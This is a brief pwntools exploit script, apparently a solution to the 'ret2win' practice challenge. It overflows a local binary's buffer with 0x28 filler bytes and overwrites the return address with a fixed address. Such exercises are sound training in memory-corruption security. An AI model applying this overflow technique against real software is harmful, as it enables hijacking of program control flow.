from pwn import *

r = process('./ret2win')

offset = 0x28
payload = 'a' * offset + p64(0x00400811)

r.recv()
r.send(payload)

r.interactive()
